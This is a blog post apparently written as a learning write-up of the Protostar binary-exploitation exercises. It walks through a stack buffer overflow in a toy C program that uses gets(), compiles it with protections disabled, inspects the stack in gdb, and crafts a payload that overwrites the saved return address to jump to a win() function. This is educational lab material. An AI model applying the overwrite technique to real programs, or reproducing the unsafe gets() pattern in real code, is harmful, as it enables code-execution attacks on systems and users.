<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="IntroductionA month ago, I started attempting to complete the protostar exploitation exercises. These exercises go through the basics of binary exploitation allowing the student to practice the more f">
<meta property="og:type" content="article">
<meta property="og:title" content="Binary Exploitation - Protostar - Stack">
<meta property="og:url" content="https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/index.html">
<meta property="og:site_name" content="Winston&#39;s Blog">
<meta property="og:description" content="IntroductionA month ago, I started attempting to complete the protostar exploitation exercises. These exercises go through the basics of binary exploitation allowing the student to practice the more f">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2019-12-30T20:50:27.000Z">
<meta property="article:modified_time" content="2020-04-28T14:09:39.116Z">
<meta property="article:author" content="Winston Zhao">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.png">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
          
        
    
    <!-- title -->
    <title>Binary Exploitation - Protostar - Stack</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/01/03/binary-exploitation-protostar-format-string/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&text=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&title=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&is_video=false&description=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Binary Exploitation - Protostar - Stack&body=Check out this article: https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&title=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&title=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&title=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&title=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&name=Binary Exploitation - Protostar - Stack&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&t=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Stack-Overflows"><span class="toc-number">2.</span> <span class="toc-text">Stack Overflows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Arbitrary-Read-Write"><span class="toc-number">2.1.</span> <span class="toc-text">Arbitrary Read&#x2F;Write</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example"><span class="toc-number">2.1.1.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Redirection"><span class="toc-number">2.2.</span> <span class="toc-text">Code Redirection</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Binary Exploitation - Protostar - Stack
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Winston's Blog</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-12-30T20:50:27.000Z" itemprop="datePublished">2019-12-31</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Security/" rel="tag">Security</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>A month ago, I started attempting to complete the protostar exploitation exercises. These exercises go through the basics of binary exploitation allowing the student to practice the more fundamental skills on a vulnerable kernel of Linux.</p>
<p>The three main exploits that are taught are string format, stack overflow and heap overflow. The course starts off with the easier versions of these exploits and slowly progresses to challenges that require more precision and understanding.</p>
<p>For this series of blog posts, I’ll outline the understanding that’s required to create a solution for the final three levels that are a accumulation of the skills that were learned during the previous challenges. </p>
<p>Much of the solutions were created by following the guide by LiveOverflow on Youtube, however it is probably worth writing up regardless for my own educational purposes.</p>
<h1 id="Stack-Overflows"><a href="#Stack-Overflows" class="headerlink" title="Stack Overflows"></a>Stack Overflows</h1><h2 id="Arbitrary-Read-Write"><a href="#Arbitrary-Read-Write" class="headerlink" title="Arbitrary Read/Write"></a>Arbitrary Read/Write</h2><p>The size of the stack frame for any function is determinable at compile-time. This means that it is possible for a stack frame to grow downwards towards the base of the previous stack frame and for current stack frame to <em>never</em> overwrite information within the previous one.</p>
<p>Side Note: this is also why dynamic memory cannot be allocated on the stack, the compiler <strong>needs</strong> to know exactly how many bytes to allocate for the stack frame at compile-time and this isn’t possible if we dynamically allocate memory in the stack.</p>
<p>However, if certain functions are used in an unsafe way, this will allow data on the stack to be smashed. From the examples, this tends to be a function that writes to a buffer with limited size, however does not check the length of the data being written. If the data is larger than the buffer, the buffer will overflow (sometimes into the stack).</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br><span class="line">--</span><br></pre></td></tr></table></figure>

<p>We can overflow the buffer easily by inputting more than the 64 characters that we’ve allocated for it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'A' * 128"</span> | ./a.out</span><br></pre></td></tr></table></figure>
<p>This will overwrite critical stack metadata and cause the program to SEGFAULT.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5288 segmentation fault (core dumped)  ./a.out</span><br></pre></td></tr></table></figure>

<h2 id="Code-Redirection"><a href="#Code-Redirection" class="headerlink" title="Code Redirection"></a>Code Redirection</h2><p>There are a couple of ways to redirect code with a stack overflow. The most simple is overwriting the saved instruction pointer, this means that when the current function returns, we can get arbitrary code execution.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can compile this with flags that will disable some of the protections that modern systems have:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc so.c -fno-stack-protector -z execstack -no-pie</span><br></pre></td></tr></table></figure>
<p>We can take a look at the effect of overflowing the stack in <code>gdb</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./a.out</span><br></pre></td></tr></table></figure>
<p>We can take a look at <code>main</code> by disassembling.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble main</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x000000000040054a &lt;+0&gt;:	    push   %rbp</span><br><span class="line">   0x000000000040054b &lt;+1&gt;:	    mov    %rsp,%rbp</span><br><span class="line">   0x000000000040054e &lt;+4&gt;:	    sub    <span class="variable">$0x50</span>,%rsp</span><br><span class="line">   0x0000000000400552 &lt;+8&gt;:	    mov    %edi,-0x44(%rbp)</span><br><span class="line">   0x0000000000400555 &lt;+11&gt;:	mov    %rsi,-0x50(%rbp)</span><br><span class="line">   0x0000000000400559 &lt;+15&gt;:	lea    -0x40(%rbp),%rax</span><br><span class="line">   0x000000000040055d &lt;+19&gt;:	mov    %rax,%rdi</span><br><span class="line">   0x0000000000400560 &lt;+22&gt;:	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400565 &lt;+27&gt;:	callq  0x400440 &lt;gets@plt&gt;</span><br><span class="line">   0x000000000040056a &lt;+32&gt;:	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x000000000040056f &lt;+37&gt;:	leaveq </span><br><span class="line">=&gt; 0x0000000000400570 &lt;+38&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>We an see our <code>gets()</code> call at <code>main+27</code>. Let’s set a breakpoint before the function returns so we can see the state of the stack. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">break</span> *0x000000000040056f</span><br></pre></td></tr></table></figure>

<p>Now let’s run the program with an input that will overflow.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run &lt; &lt;(python -c <span class="string">'print "A" * 128'</span>)</span><br></pre></td></tr></table></figure>

<p>We should hit the breakpoint that we set previously. Let’s check what the stack looks like.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/50x <span class="variable">$rsp</span>-100</span><br></pre></td></tr></table></figure>
<p>This commands tells <code>gdb</code> that we want to see 50 “words” (technically not words since I’m running a 64bit system) of data <code>x/50x</code>, starting at the address of the stack pointer minus one hundred, <code>$rsp-100</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffd874:	0x00000000	0x0040056a	0x00000000	0xffffd9b8</span><br><span class="line">0x7fffffffd884:	0x00007fff	0x00f0b5ff	0x00000001	0x41414141</span><br><span class="line">0x7fffffffd894:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffd8a4:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffd8b4:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffd8c4:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffd8d4:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffd8e4:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffd8f4:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffd904:	0x41414141	0x41414141	0x41414141	0x00400400</span><br><span class="line">0x7fffffffd914:	0x00000000	0xffffd9b0	0x00007fff	0x00000000</span><br><span class="line">0x7fffffffd924:	0x00000000	0x00000000	0x00000000	0xa2729df4</span><br><span class="line">0x7fffffffd934:	0x1c11f557	0xa52c9df4</span><br></pre></td></tr></table></figure>
<p>We can see that our <code>A</code>‘s have overwritten a significant portion of the stack. We can see what metadata regarding the stack frame we’ve overwritten by inspecting the stack frame.<br><code>(gdb) info frame</code></p>
<p>We get the following information.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Stack level 0, frame at 0x7fffffffd8d8:</span><br><span class="line"> rip = 0x400570 <span class="keyword">in</span> main; saved rip = 0x4141414141414141</span><br><span class="line"> Arglist at 0x4141414141414141, args: </span><br><span class="line"> Locals at 0x4141414141414141, Previous frame<span class="string">'s sp is 0x7fffffffd8e0</span></span><br><span class="line"><span class="string"> Saved registers:</span></span><br><span class="line"><span class="string">  rip at 0x7fffffffd8d8</span></span><br></pre></td></tr></table></figure>
<p>We can see that we’ve overwritten a large portion of the stack frame metadata, but we’ve also written the saved <code>rip</code> which is the address of that the program will return to after the current function returns. If we overwrite this saved instruction pointer with something that we want, then we can change code flow.</p>
<p>From the output of <code>info frame</code> we can see that the saved instruction pointer is at <code>0x7fffffffd8d8</code>, which means that we’ll need 72 characters to reach it, followed by the address of the place we want to go (which in this case is the <code>winner()</code> function).</p>
<p>We can find out the address of <code>winner()</code> using the <code>print</code> command.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">print</span> win</span><br></pre></td></tr></table></figure>
<p>We get the following output.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$2</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0x400537 &lt;win&gt;</span><br></pre></td></tr></table></figure>

<p>This means that the functions starts at <code>0x400537</code>.<br>This means the address bytes will be <code>\x00\x00\x00\x00\x00\0x40\x05\x37</code>, but I’m on a little endian system (and most likely so are you), so we’ll need to flip the bytes, <code>\x37\x05\x40\x00\x00\x00\x00\x00</code>. </p>
<p>Let’s try this in <code>gdb</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r &lt; &lt;(python -c <span class="string">"print 'A' * 72 + '\x37\x05\x40\x00\x00\x00\x00\x00'"</span>)</span><br></pre></td></tr></table></figure>

<p>Using <code>c</code> to continue past the breakpoint we can see that we’ve successfully changed code execution.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r &lt; &lt;(python -c <span class="string">"print 'A' * 72 + '\x37\x05\x40\x00\x00\x00\x00\x00'"</span>)</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/winstonzhao/Projects/sb/stackoverflow/a.out &lt; &lt;(python -c <span class="string">"print 'A' * 72 + '\x37\x05\x40\x00\x00\x00\x00\x00'"</span>)</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000000000400570 <span class="keyword">in</span> main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">code flow successfully changed</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x0000000000000000 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Stack-Overflows"><span class="toc-number">2.</span> <span class="toc-text">Stack Overflows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Arbitrary-Read-Write"><span class="toc-number">2.1.</span> <span class="toc-text">Arbitrary Read&#x2F;Write</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example"><span class="toc-number">2.1.1.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Redirection"><span class="toc-number">2.2.</span> <span class="toc-text">Code Redirection</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&text=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&title=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&is_video=false&description=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Binary Exploitation - Protostar - Stack&body=Check out this article: https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&title=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&title=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&title=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&title=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&name=Binary Exploitation - Protostar - Stack&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://winstonzhao.github.io/2019/12/31/binary-exploitation-protostar-stack/&t=Binary Exploitation - Protostar - Stack" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Winston Zhao
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
